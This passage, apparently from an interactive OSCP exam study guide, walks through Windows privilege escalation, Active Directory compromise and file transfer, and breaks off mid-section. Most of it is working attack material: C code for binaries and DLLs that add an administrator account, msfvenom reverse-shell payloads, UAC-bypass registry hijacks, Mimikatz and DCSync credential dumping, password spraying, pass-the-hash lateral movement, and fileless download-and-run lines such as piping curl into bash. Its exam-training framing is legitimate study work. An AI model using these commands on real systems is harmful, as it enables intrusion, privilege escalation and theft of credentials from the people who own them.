Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like "Running"}

# ── STEP 2: CHECK BINARY PERMISSIONS ─────────────────
# F = Full access (can replace), RX = Read+Execute only (cannot replace)
icacls "C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe"

# PowerUp automated check
. .\\PowerUp.ps1
Get-ModifiableServiceFile

# accesschk
.\\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
.\\accesschk.exe /accepteula -uwcqv "Everyone" *

# ── STEP 3: CREATE MALICIOUS BINARY (on Kali) ─────────
# C code adds admin user:
# int main() {
#   system("net user hacker pass123! /add");
#   system("net localgroup administrators hacker /add");
# }
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
# Or reverse shell:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o shell.exe

# ── STEP 4: REPLACE THE BINARY ────────────────────────
# Backup original first!
move C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe C:\\\\Users\\\\dave\\\\mysqld.exe.bak

# Transfer and place
iwr http://$lhost/adduser.exe -OutFile adduser.exe
move .\\adduser.exe C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe

# ── STEP 5: RESTART SERVICE ───────────────────────────
# Try manual restart (usually denied)
net stop mysql
net start mysql

# Check startup type
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like "mysql"}

# Check reboot privilege
whoami /priv | findstr Shutdown

# Reboot if Auto + SeShutdownPrivilege
shutdown /r /t 0

# ── STEP 6: VERIFY ────────────────────────────────────
Get-LocalGroupMember Administrators

# ── STEP 7: RESTORE ───────────────────────────────────
move C:\\\\Users\\\\dave\\\\mysqld.exe.bak C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe
shutdown /r /t 0`,
    warn: "Always backup the original binary before replacing. Note what you changed for the report and restore it. Rebooting can cause unexpected issues — only do it in lab environments.",
    choices: [
      { label: "Got admin user — RDP in", next: "got_root_windows" },
      { label: "Need to build adduser.exe / DLL payload", next: "win_compile" },
      { label: "Cannot restart or reboot — try DLL hijack", next: "win_dll_hijack" },
    ],
  },
  win_compile: {
    phase: "WINDOWS",
    title: "Windows Payload Compilation (Kali)",
    body: "Cross-compile Windows binaries and DLLs on Kali with mingw. Module 17.2: adduser.c is the go-to for service binary hijacking, DLL hijacking, scheduled task abuse, and unquoted paths.",
    cmd: `# ── INSTALL MINGW ────────────────────────────────────
sudo apt install mingw-w64 -y

# ── ADDUSER.C — add admin user ───────────────────────
# Save as adduser.c:
# #include <stdlib.h>
# int main() {
#   int i;
#   i = system("net user dave2 password123! /add");
#   i = system("net localgroup administrators dave2 /add");
#   return 0;
# }

# Compile 64-bit EXE:
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Compile 32-bit EXE:
i686-w64-mingw32-gcc adduser.c -o adduser32.exe

# ── ADDUSER DLL — for DLL hijacking ──────────────────
# Save as adduser.cpp:
# #include <stdlib.h>
# #include <windows.h>
# BOOL APIENTRY DllMain(HANDLE hModule, DWORD reason, LPVOID reserved) {
#   switch(reason) {
#     case DLL_PROCESS_ATTACH:
#       system("net user dave3 password123! /add");
#       system("net localgroup administrators dave3 /add");
#       break;
#   }
#   return TRUE;
# }

# Compile 64-bit DLL:
x86_64-w64-mingw32-gcc adduser.cpp --shared -o TextShaping.dll

# ── REVERSE SHELL EXE ────────────────────────────────
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -e x86/shikata_ga_nai -o shell_enc.exe

# ── REVERSE SHELL DLL ────────────────────────────────
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f dll -o shell.dll

# ── MSI (AlwaysInstallElevated) ──────────────────────
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f msi -o evil.msi

# ── SERVE AND TRANSFER ───────────────────────────────
python3 -m http.server 80
# On Windows:
iwr http://$lhost/adduser.exe -OutFile C:\\Windows\\Temp\\adduser.exe
Unblock-File C:\\Windows\\Temp\\adduser.exe

# ── USE CASES ────────────────────────────────────────
# Service binary hijacking  -> adduser.exe replaces mysqld.exe
# DLL hijacking             -> adduser.dll renamed to missing DLL
# Unquoted service path     -> adduser.exe renamed to Current.exe
# Scheduled task            -> adduser.exe replaces task binary
# All of the above          -> same C code, different placement`,
    warn: null,
    choices: [
      { label: "Service binary hijacking", next: "weak_service" },
      { label: "DLL hijacking", next: "win_dll_hijack" },
      { label: "Unquoted service path", next: "unquoted_service" },
      { label: "Scheduled task abuse", next: "scheduled_tasks_win" },
    ],
  },



  win_dll_hijack: {
    phase: "WINDOWS",
    title: "DLL Hijacking",
    body: "Module 17.2.2: Service loads a DLL from a writable directory before System32. Plant a malicious DLL with the missing name. Procmon is your tool to find NAME NOT FOUND DLL loads.",
    cmd: `# ── DLL SEARCH ORDER (Windows) ───────────────────────
# 1. Application directory  <- check this first
# 2. System32
# 3. System (SysWOW64)
# 4. Windows directory
# 5. Current directory
# 6. PATH directories  <- often writable

# ── STEP 1: FIND MISSING DLL (Procmon method) ─────────
# Need GUI/RDP for Procmon
# 1. Run Procmon64.exe as admin
# 2. Filter: Process Name = target.exe
# 3. Filter: Operation = CreateFile
# 4. Filter: Result = NAME NOT FOUND
# 5. Filter: Path ends with .dll
# 6. Look for DLLs loaded from writable directories

# ── STEP 2: CONFIRM WRITE ACCESS TO TARGET DIR ────────
# Test write access:
echo "test" > "C:\Program Files\VulnApp\test.txt"
type "C:\Program Files\VulnApp\test.txt"

# icacls check:
icacls "C:\Program Files\VulnApp\"

# ── STEP 3: CREATE MALICIOUS DLL (on Kali) ────────────
# C++ DLL template — runs on DLL_PROCESS_ATTACH
# #include <stdlib.h>
# #include <windows.h>
# BOOL APIENTRY DllMain(HANDLE hModule, DWORD reason, LPVOID reserved) {
#   switch(reason) {
#     case DLL_PROCESS_ATTACH:
#       system("net user hacker pass123! /add");
#       system("net localgroup administrators hacker /add");
#       break;
#   }
#   return TRUE;
# }

# Compile as DLL:
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll

# Or msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f dll -o TextShaping.dll

# ── STEP 4: PLANT THE DLL ─────────────────────────────
# Transfer and place in application directory
iwr http://$lhost/TextShaping.dll -OutFile "C:\FileZilla\FileZilla FTP Client\TextShaping.dll"

# ── STEP 5: TRIGGER ───────────────────────────────────
# Option A: Restart the service
sc stop VulnService
sc start VulnService

# Option B: Wait for privileged user to run the app
# If a high-priv user runs the app it loads our DLL with their privileges
net user  # check periodically for new admin user

# Option C: Reboot (if Auto service + SeShutdownPrivilege)
shutdown /r /t 0

# ── STEP 6: VERIFY ────────────────────────────────────
net user
net localgroup administrators

# ── PATH DLL HIJACK ───────────────────────────────────
# If a binary in PATH calls LoadLibrary("missing.dll"):
# Find writable PATH dirs
echo %PATH%
# Drop DLL in first writable dir before System32`,
    warn: "64-bit process needs 64-bit DLL — msfvenom defaults to 32-bit, use windows/x64 explicitly. The DLL runs with the privileges of whoever launches the application — wait for a high-priv user if needed.",
    choices: [
      { label: "DLL loaded — got shell/new admin", next: "got_root_windows" },
      { label: "Cannot restart service — wait or reboot", next: "persistence" },
      { label: "No writable service dir — try unquoted path", next: "unquoted_service" },
    ],
  },


  win_uac_bypass: {
    phase: "WINDOWS",
    title: "UAC Bypass — Medium to High Integrity",
    body: "In Administrators group but commands fail? UAC is blocking medium integrity. Bypass to elevate to high integrity without a GUI prompt. Requires local admin group membership. Reference: MITRE T1548.002, LOLBAS Project (lolbas-project.github.io).",
    cmd: `# -- CONFIRM UAC IS THE ISSUE -------------
whoami /groups | findstr /i "mandatory\|integrity"
# Medium Mandatory Level = UAC restricting you
# High Mandatory Level = already elevated, not UAC

# -- METHOD 1: FODHELPER (Win 10/11) ------
# Pure registry — no binary needed
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
  -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
  -Name "(default)" -Value "C:\Windows\Temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe"

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

# -- METHOD 2: EVENTVWR (older Windows) ---
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" \
  "(default)" "C:\Windows\Temp\shell.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"

# -- METHOD 3: CMSTP.EXE ------------------
# Requires crafted .inf file
# Reference: MITRE T1218.003

# -- METHOD 4: ISCSICPL.EXE (reliable, Win 10/11) -----
# iscsicpl.exe is auto-elevated — hijack via PATH
# Step 1: create payload on Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o iscsicpl.exe

# Step 2: create writable dir, drop fake binary
mkdir C:\\Windows\\Temp\\uac
iwr http://$lhost/iscsicpl.exe -OutFile C:\\Windows\\Temp\\uac\\iscsicpl.exe
Unblock-File C:\\Windows\\Temp\\uac\\iscsicpl.exe

# Step 3: prepend dir to PATH for this session
$env:PATH = "C:\\Windows\\Temp\\uac;" + $env:PATH

# Step 4: launch iscsicpl — auto-elevates and finds
# your fake binary first in PATH
Start-Process iscsicpl

# -- METHOD 5: CONFIGURATION MANAGER (GUI/RDP) ----------
# If you have RDP access:
# 1. Win+R -> type: msconfig -> Enter
# 2. UAC prompt appears — click Show Details
# 3. In the msconfig window: Tools tab
# 4. Select "Command Prompt" -> click Launch
# 5. This cmd runs at HIGH integrity — no prompt!
# Alternative: Win+R -> eventvwr -> File -> Run task
#   as administrator — browse to cmd.exe

# -- METHOD 6: UACME ----------------------
# 60+ bypass methods, regularly updated
# github.com/hfiref0x/UACME
.\\Akagi64.exe 33 C:\\Windows\\Temp\\shell.exe
.\\Akagi64.exe 61 C:\\Windows\\Temp\\shell.exe

# -- LISTENER -----------------------------
nc -nlvp $lport`,
    warn: "If whoami /groups shows you are NOT in the Administrators group — UAC bypass won't help. You need actual privilege escalation first, not just integrity elevation. These are different problems.",
    choices: [
      { label: "High integrity shell achieved", next: "got_root_windows" },
      { label: "Not in Administrators — wrong path", next: "winpeas" },
      { label: "Try token impersonation instead", next: "token_privs" },
    ],
  },

  got_root_windows: {
    phase: "WINDOWS",
    title: "SYSTEM — Windows",
    body: "SYSTEM shell. Get proof, take the screenshot correctly. whoami + hostname + ipconfig + proof.txt all visible.",
    cmd: `whoami   # should show NT AUTHORITY\\SYSTEM or Administrator
hostname
ipconfig /all
type C:\\Users\\Administrator\\Desktop\\proof.txt

# ── POST-SYSTEM ACTIONS ──────────────────────────────
# Dump hashes immediately
reg save HKLM\\SAM C:\\Windows\\Temp\\sam
reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system
impacket-secretsdump -sam sam -system system local

# Mimikatz — plaintext creds from LSASS
iwr http://$lhost/mimikatz.exe -OutFile C:\\Windows\\Temp\\m.exe
.\\m.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Spray dumped hashes laterally
crackmapexec smb $ip/24 -u Administrator -H NTLMHASH --shares
crackmapexec smb $ip/24 -u Administrator -H NTLMHASH -x "whoami"


# Screenshot checklist:
# ✅ whoami showing SYSTEM or Administrator
# ✅ hostname visible
# ✅ ipconfig showing target IP
# ✅ type proof.txt showing hash
# ✅ All in ONE screenshot`,
    warn: null,
    choices: [
      { label: "New subnet in route print — pivot!", next: "pivot_start" },
      { label: "Back to start — next machine", next: "start" },
    ],
  },

  // ==========================================
  //  ACTIVE DIRECTORY
  // ==========================================
  ad_start: {
    phase: "AD",
    title: "Active Directory — Assumed Breach",
    body: "OSCP+ gives you low-priv domain creds. You're starting inside. Add DC to /etc/hosts, enumerate the domain, run BloodHound immediately.",
    cmd: `# Add DC to hosts
echo "$ip dc01.domain.com domain.com" >> /etc/hosts

# -- Verify connectivity -----------------------
# nxc (netexec) — CME successor, same syntax, actively maintained
nxc smb $ip -u user -p 'pass'
crackmapexec smb $ip -u user -p 'pass'   # fallback if nxc not installed

# -- Initial domain recon ----------------------
nxc smb $ip -u user -p 'pass' --users
nxc smb $ip -u user -p 'pass' --groups
nxc smb $ip -u user -p 'pass' --shares
nxc smb $ip -u user -p 'pass' --pass-pol   # CHECK LOCKOUT BEFORE SPRAYING

# -- ldapdomaindump — fast HTML/JSON AD dump ---
# Outputs users, groups, computers as HTML + JSON
ldapdomaindump -u 'domain\\user' -p 'pass' $ip -o /tmp/ldd/
# Open domain_users.html and domain_groups.html for quick visual map

# -- windapsearch — LDAP enum without domain join --
windapsearch --dc-ip $ip -d domain.com -u user@domain.com -p 'pass' -m users
windapsearch --dc-ip $ip -d domain.com -u user@domain.com -p 'pass' -m groups
windapsearch --dc-ip $ip -d domain.com -u user@domain.com -p 'pass' -m computers
windapsearch --dc-ip $ip -d domain.com -u user@domain.com -p 'pass' -m privileged-users

# -- ldapsearch — raw fallback -----------------
ldapsearch -x -h $ip -D "user@domain.com" -w 'pass' \
  -b "dc=domain,dc=com" "(objectClass=user)" | grep sAMAccountName`,
    warn: "Check password policy BEFORE any spraying — nxc smb --pass-pol. Lockouts on the exam are catastrophic. ldapdomaindump HTML output is the fastest way to visually map the domain before BloodHound finishes. nxc is the maintained fork of crackmapexec — prefer it where installed.",
    choices: [
      { label: "Run BloodHound (mandatory)", next: "bloodhound" },
      { label: "Run Responder first (passive hash capture)", next: "responder" },
      { label: "AS-REP Roast first (no pre-auth accounts)", next: "asrep_roast" },
      { label: "Kerberoast (SPN accounts)", next: "kerberoast" },
      { label: "Password spray (carefully)", next: "ad_spray" },
    ],
  },


  bloodhound: {
    phase: "AD",
    title: "BloodHound",
    body: "Run this early and let it collect in the background. BloodHound will show you paths you'd never find manually. Shortest Path to DA is your first query.",
    cmd: `# bloodhound-python from Kali (no agent needed)
bloodhound-python -u user -p 'pass' \\
  -d domain.com -ns $ip -c All

# Or SharpHound from Windows target
iwr http://$lhost/SharpHound.exe -OutFile C:\\Windows\\Temp\\sh.exe
.\\sh.exe -c All --zipfilename bh.zip

# Start BloodHound
sudo neo4j start
bloodhound

# Key queries to run immediately:
# 1. Shortest Path to Domain Admins
# 2. Find AS-REP Roastable Users
# 3. Find Kerberoastable Users
# 4. Find Principals with DCSync Rights
# 5. Computers Where Domain Users are Local Admin`,
    warn: null,
    choices: [
      { label: "Kerberoastable accounts found", next: "kerberoast" },
      { label: "AS-REP Roastable accounts found", next: "asrep_roast" },
      { label: "ACL abuse path found", next: "acl_abuse" },
      { label: "Delegation abuse path found", next: "delegation" },
      { label: "AD CS vulnerable templates", next: "adcs" },
      { label: "BloodHound found nothing useful", next: "ad_manual" },
      { label: "No direct path — password spray", next: "ad_spray" },
    ],
  },

  asrep_roast: {
    phase: "AD",
    title: "AS-REP Roasting",
    body: "Accounts with pre-auth disabled hand you encrypted TGTs to crack offline. Fast, no noise, no lockout risk.",
    cmd: `# From Kali — no password needed if pre-auth disabled
impacket-GetNPUsers domain.com/ \\
  -usersfile users.txt -dc-ip $ip \\
  -request -outputfile asrep.txt

# With creds (more reliable)
impacket-GetNPUsers domain.com/user:'pass' \\
  -dc-ip $ip -request -o asrep.kerb

# Kerbrute (also finds them)
./kerbrute_linux_amd64 userenum \\
  -d domain.com --dc $ip \\
  /opt/SecLists/Usernames/Names/names.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule`,
    warn: null,
    choices: [
      { label: "Cracked — got new account creds", next: "creds_found" },
      { label: "No pre-auth disabled accounts — Kerberoast", next: "kerberoast" },
    ],
  },

  kerberoast: {
    phase: "AD",
    title: "Kerberoasting",
    body: "Request service tickets for any SPN-enabled account and crack them offline. Service accounts often have weak passwords.",
    cmd: `# From Kali with creds
impacket-GetUserSPNs domain.com/user:'pass' \\
  -dc-ip $ip -request -outputfile tgs.txt

# Check what accounts exist
impacket-GetUserSPNs domain.com/user:'pass' \\
  -dc-ip $ip

# PowerView on Windows
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# Rubeus on Windows
.\\Rubeus.exe kerberoast /outfile:tgs.txt

# Crack
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule`,
    warn: null,
    choices: [
      { label: "Cracked service account hash!", next: "creds_found" },
      { label: "No luck cracking — try ACL abuse", next: "acl_abuse" },
    ],
  },

  ad_spray: {
    phase: "AD",
    title: "Password Spraying",
    body: "One password across all users. Seasonal passwords, company name variants, default creds. One attempt per account per window to avoid lockout.",
    cmd: `# CHECK POLICY FIRST — before any spraying
nxc smb $ip -u user -p 'pass' --pass-pol
crackmapexec smb $ip -u user -p 'pass' --pass-pol   # fallback

# Spray with nxc (netexec) — preferred, CME successor
nxc smb $ip -u users.txt -p 'Password123!' --continue-on-success
nxc smb $ip -u users.txt -p 'Winter2025!' --continue-on-success

# Also spray other services simultaneously
nxc winrm $ip -u users.txt -p 'Password123!'
nxc rdp   $ip -u users.txt -p 'Password123!'
nxc ssh   $ip -u users.txt -p 'Password123!'

# Kerbrute spray — faster, fewer logon events than LDAP
./kerbrute_linux_amd64 passwordspray \
  -d domain.com --dc $ip \
  users.txt 'Password123!'

# Common spray passwords:
# Password1!   Welcome1!   Summer2024!
# Winter2025!  Company123! <CompanyName>1!`,
    warn: "One spray attempt per lockout window — locking accounts is exam failure. nxc (netexec) is the maintained fork of crackmapexec with identical syntax. Spray SMB, WinRM, and RDP in the same pass.",
    choices: [
      { label: "Spray hit — got new creds", next: "creds_found" },
      { label: "Nothing — AS-REP roast or Kerberoast", next: "asrep_roast" },
    ],
  },


  acl_abuse: {
    phase: "AD",
    title: "ACL Abuse",
    body: "BloodHound showed you a misconfigured ACL. GenericAll, GenericWrite, WriteDACL, ForceChangePassword — all paths to escalation.",
    cmd: `# GenericAll over user — force password reset
Set-DomainUserPassword -Identity targetuser \\
  -AccountPassword (ConvertTo-SecureString 'Hack3d!23' -AsPlainText -Force)

# GenericAll over group — add yourself
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'youruser'

# WriteDACL — grant yourself DCSync
Add-DomainObjectAcl \\
  -TargetIdentity "DC=domain,DC=com" \\
  -PrincipalIdentity youruser \\
  -Rights DCSync

# ForceChangePassword
cred = New-Object System.Net.NetworkCredential("","NewPass123!")
Set-DomainUserPassword -Identity target -AccountPassword cred.SecurePassword

# DCSync once you have rights
.\\mimikatz.exe "privilege::debug" \\
  "lsadump::dcsync /domain:domain.com /user:administrator" "exit"`,
    warn: null,
    choices: [
      { label: "Got DA hash via DCSync", next: "dcsync" },
      { label: "Added self to Domain Admins — lateral move", next: "lateral_movement" },
    ],
  },

  delegation: {
    phase: "AD",
    title: "Delegation Attacks",
    body: "Unconstrained delegation captures TGTs. Constrained delegation allows S4U impersonation. Both can reach Domain Admin.",
    cmd: `# Find unconstrained delegation
Get-DomainComputer -Unconstrained | select name
Get-DomainUser -AllowDelegation -AdminCount | select name

# Find constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto

# S4U2Self + S4U2Proxy (Rubeus — no MSF)
.\\Rubeus.exe s4u \\
  /user:svcaccount \\
  /rc4:NTLM_HASH \\
  /impersonateuser:administrator \\
  /msdsspn:"CIFS/dc01.domain.com" \\
  /ptt

# Verify ticket loaded
.\\Rubeus.exe klist`,
    warn: null,
    choices: [
      { label: "Ticket loaded — lateral move to DC", next: "lateral_movement" },
    ],
  },

  lateral_movement: {
    phase: "AD",
    title: "Lateral Movement",
    body: "Move between machines with creds, hashes, or Kerberos tickets. impacket suite covers everything — no MSF console needed.",
    cmd: `# evil-winrm (WinRM 5985/5986)
evil-winrm -i $target -u admin -p 'pass'
evil-winrm -i $target -u admin -H NTLM_HASH

# psexec (requires admin + file write to ADMIN$)
impacket-psexec domain/admin:'pass'@$target
impacket-psexec domain/admin@$target -hashes :NTLM_HASH

# wmiexec (stealthier — no service creation)
impacket-wmiexec domain/admin:'pass'@$target

# smbexec
impacket-smbexec domain/admin:'pass'@$target

# Pass-the-ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain/admin@dc01.domain.com

# PowerShell remoting
Enter-PSSession -ComputerName $target -Credential domain\\admin`,
    warn: null,
    choices: [
      { label: "On DC — DCSync everything", next: "dcsync" },
      { label: "On member server — privesc further", next: "windows_post_exploit" },
    ],
  },

  dcsync: {
    phase: "AD",
    title: "DCSync — Domain Owned",
    body: "DCSync dumps all domain hashes. You have replication rights — pull every account. This is game over for the domain.",
    cmd: `# Mimikatz DCSync (on Windows — no MSF)
.\\mimikatz.exe "privilege::debug" \\
  "lsadump::dcsync /domain:domain.com /user:administrator" \\
  "exit"

# Dump all hashes
.\\mimikatz.exe "privilege::debug" \\
  "lsadump::dcsync /domain:domain.com /all /csv" \\
  "exit"

# impacket-secretsdump (from Kali — no agent)
impacket-secretsdump domain/admin:'pass'@<DCIP>
impacket-secretsdump domain/admin@<DCIP> -hashes :NTLM_HASH
impacket-secretsdump domain/admin:'pass'@<DCIP> -just-dc-ntlm

# PTH to DC as Administrator
evil-winrm -i <DCIP> -u administrator -H <NTLM_HASH>`,
    warn: null,
    choices: [
      { label: "Domain Admin shell on DC — grab proof", next: "ad_complete" },
    ],
  },

  ad_complete: {
    phase: "AD",
    title: "Domain Admin — AD Set Complete",
    body: "40 points locked in. Screenshot each machine in the chain: initial workstation, pivot machine, DC. All three need proof.txt + whoami + hostname + IP.",
    cmd: `# On Domain Controller
whoami
hostname
ipconfig
type C:\\Users\\Administrator\\Desktop\\proof.txt

# Screenshot checklist for full AD set:
# ✅ Machine 1: whoami + hostname + IP + local.txt
# ✅ Machine 2: whoami + hostname + IP + local.txt
# ✅ DC: whoami (DA) + hostname + IP + proof.txt
# ✅ Full attack chain documented in report`,
    warn: null,
    choices: [
      { label: "Now hit the standalone machines", next: "start" },
    ],
  },

  // ==========================================
  //  MINDSET — THE INNER PATH
  // ==========================================

  mindset_preexam: {
    phase: "MINDSET",
    title: "Pre-Exam — Before the Clock Starts",
    body: "The exam begins before you click Start. Environment failure at hour 3 is not bad luck — it is skipped preparation. Do this now, while the mind is calm.",
    cmd: `# -- ENVIRONMENT -------------------------
# VPN connected and stable
sudo openvpn ~/oscp.ovpn &
ping 10.10.10.1   # confirm routing

# File descriptor limit — required for rustscan full port scans
ulimit -n 5000

# Kali updated, tools present
which nmap gobuster feroxbuster ligolo-ng evil-winrm impacket-secretsdump

# Wordlists in place
ls /usr/share/wordlists/rockyou.txt
ls /usr/share/seclists/Discovery/Web-Content/

# Results folder template ready
mkdir -p ~/exam/{machine1,machine2,machine3,ad}/{scans,exploits,loot,screenshots,tunnels}

# -- TIME PLAN ----------------------------
# 23h 45m total. Suggested blocks:
# Hour  0-2:  Recon ALL machines in parallel. Do not exploit yet.
# Hour  2-6:  Attack highest-confidence target first.
# Hour  6-10: Second machine. AD set — push this if recon is clear.
# Hour 10-14: Third machine. Revisit stalled machines fresh.
# Hour 14-18: Fill gaps. Partial flags count.
# Hour 18-22: Documentation. Stop hacking at hour 22.
# Hour 22-24: Report finalization and submission.

# -- MENTAL CONTRACT ----------------------
# You will get stuck. That is part of the exam.
# Stuck is not failing. Stuck is information.
# When stuck: document what you know, rotate machine, return fresh.`,
    warn: "Enumerate ALL machines before deep-diving any single one. Parallel recon in the first 2 hours is the highest-leverage action of the entire exam.",
    choices: [
      { label: "Clock is running — start recon", next: "start" },
      { label: "I am already stuck mid-exam", next: "mindset_stuck" },
    ],
  },

  mindset_stuck: {
    phase: "MINDSET",
    title: "Arjuna on Kurukshetra",
    body: "You are not failing. The mind has contracted. Arjuna froze before the greatest battle of his life — not from lack of skill, but from overwhelm. Krishna did not tell him to try harder. He told him to see clearly. Stop. Do that now.",
    cmd: `# -- STOP THE SPIRAL ---------------------
# Close unnecessary terminals. One window.
# Write down — right now — what you actually know:

echo "Machine: $ip"
echo "Ports open: [list them]"
echo "Services: [list them]"
echo "What I tried: [list it]"
echo "What actually happened: [not what you expected — what happened]"
echo "What I have NOT tried: [honest list]"

# -- THE THREE QUESTIONS ------------------
# 1. Have I fully enumerated, or did I start exploiting too early?
#    gobuster/feroxbuster still running? Nmap UDP done?
# 2. Am I trying the same thing repeatedly expecting different results?
#    If yes — that vector is closed. Move.
# 3. Is there another machine I can make progress on right now?
#    Rotate. Come back in 45 minutes. Fresh eyes find what tired eyes miss.

# -- THE POMODORO RESET -------------------
# Set a timer: 25 minutes.
# Pick ONE specific thing to test. Not enumerate more. One thing.
# When the timer ends — stop. Assess. Decide.`,
    warn: "The most common OSCP failure is not insufficient skill — it is 4 hours on one rabbit hole while other machines sit untouched. Rotation is not giving up. It is strategy.",
    choices: [
      { label: "I think I am in a rabbit hole", next: "mindset_rabbithole" },
      { label: "I need to triage my time", next: "mindset_triage" },
      { label: "Back to recon — fresh start on this machine", next: "start" },
    ],
  },

  mindset_rabbithole: {
    phase: "MINDSET",
    title: "The Rabbit Hole",
    body: "A rabbit hole feels like progress because you are moving. But movement without position change is just spinning. The signs are specific. Check them now.",
    cmd: `# -- RABBIT HOLE DIAGNOSTIC --------------
# Answer honestly:

# 1. HOW LONG on this single vector?
#    > 45 minutes without forward movement = rabbit hole

# 2. WHAT IS YOUR EVIDENCE this vector is valid?
#    Gut feeling is not evidence.
#    A version number + confirmed CVE is evidence.
#    A confirmed parameter + confirmed reflection is evidence.

# 3. HAVE YOU GOOGLED THE EXACT ERROR MESSAGE?
#    Not the general technique — the exact error you are seeing.

# 4. HAVE YOU READ THE ACTUAL RESPONSE?
#    View page source. Read response headers.
#    What is the app actually telling you?

# -- THE EXIT PROTOCOL --------------------
# Document where you are — exact URL, payload, response.
# Write: Paused — potential vector, needs revisit
# Set it down completely.

# Rotate to a different machine NOW.
# Do not think about this machine for 45 minutes.
# When you return you will see it differently.
# This is not metaphor — it is how the brain processes problems offline.

# -- COMMON FALSE RABBIT HOLES ------------
# "There must be a SQLi here" — have you tried other params?
# "This LFI should work" — tried /proc/self/environ, php://filter?
# "The exploit should work" — exact version match confirmed?
# "I just need to tweak the payload" — after 10 tweaks, vector is wrong`,
    warn: "Sunk cost is the enemy of the path. The time already spent is gone. The only question is: what is the best use of the time remaining?",
    choices: [
      { label: "Rotating — go back to start for another machine", next: "start" },
      { label: "I need to triage where to spend remaining time", next: "mindset_triage" },
      { label: "I have a real lead — back to targeted scan", next: "targeted_scan" },
    ],
  },


  // ==========================================
  //  FILE TRANSFER
  // ==========================================

  file_transfer: {
    phase: "SHELL",
    title: "File Transfer — Get Tools on Target",
    body: "Getting tools onto a target is a skill. Know at least 3 methods per OS — one will always be blocked. Start your HTTP server first, then choose delivery method based on what's available.",
    cmd: `# -- ATTACKER: START FILE SERVER ----------
python3 -m http.server 80
python3 -m http.server 443   # if 80 blocked
# Or SMB share (Windows targets love this):
impacket-smbserver share . -smb2support
impacket-smbserver share /path/to/tools -smb2support -username user -password pass

# -- LINUX: DOWNLOAD TO TARGET -------------
# wget — most common on Linux targets
wget http://$lhost/linpeas.sh -O /tmp/lp.sh          # rename output
wget -q http://$lhost/shell.elf -O /tmp/s             # quiet, short name
wget --no-check-certificate https://$lhost/shell.elf -O /tmp/s  # ignore SSL
wget -c http://$lhost/bigfile.tar.gz -O /tmp/f.tgz   # resume interrupted
wget -b http://$lhost/linpeas.sh -O /tmp/lp.sh        # background download
wget --user=user --password=pass http://$lhost/file   # authenticated
# POST request via wget
wget --post-data="cmd=id" http://$ip/exec.php -O -

# curl — fallback if wget missing
curl http://$lhost/linpeas.sh -o /tmp/lp.sh
curl -k https://$lhost/shell.elf -o /tmp/s            # ignore SSL
curl http://$lhost/shell.elf | bash                   # fileless — never touches disk

# nc transfer (no HTTP available)
# Attacker: nc -nlvp 4444 < file.sh
# Target:   nc $lhost 4444 > /tmp/file.sh

# base64 transfer (no network tools)
# Attacker: base64 -w0 linpeas.sh
# Target:   echo "BASE64" | base64 -d > /tmp/lp.sh

# SCP (if SSH available)
scp linpeas.sh user@$ip:/tmp/lp.sh

# -- WINDOWS: DOWNLOAD TO TARGET ----------
# -- certutil (LOLBin — built-in, hard to block) --
# T1105: Ingress Tool Transfer
# Paths: C:\Windows\System32\certutil.exe
#        C:\Windows\SysWOW64\certutil.exe

# Standard download — saves to current folder
certutil.exe -urlcache -f http://$lhost/shell.exe shell.exe

# -split avoids caching (cleaner, less artifacts)
certutil.exe -urlcache -split -f http://$lhost/shell.exe C:\Windows\Temp\shell.exe

# verifyctl — alternate download method, same result
certutil.exe -verifyctl -f http://$lhost/shell.exe shell.exe

# Save to Alternate Data Stream (ADS) — hides from dir listing
# T1564.004: NTFS File Attributes
certutil.exe -urlcache -f http://$lhost/shell.ps1 C:\Windows\Temp\legit.txt:hidden

# -- certutil encode/decode (T1027.013 / T1140) ---
# Encode a file to base64 — useful for exfil or transfer
certutil -encode C:\Windows\Temp\shell.exe shell.b64

# Decode base64 back to binary
certutil -decode shell.b64 C:\Windows\Temp\shell.exe

# Decode hex-encoded file
certutil -decodehex shell.hex C:\Windows\Temp\shell.exe

# Verify transfer integrity
certutil -hashfile C:\Windows\Temp\shell.exe MD5

# PowerShell DownloadFile
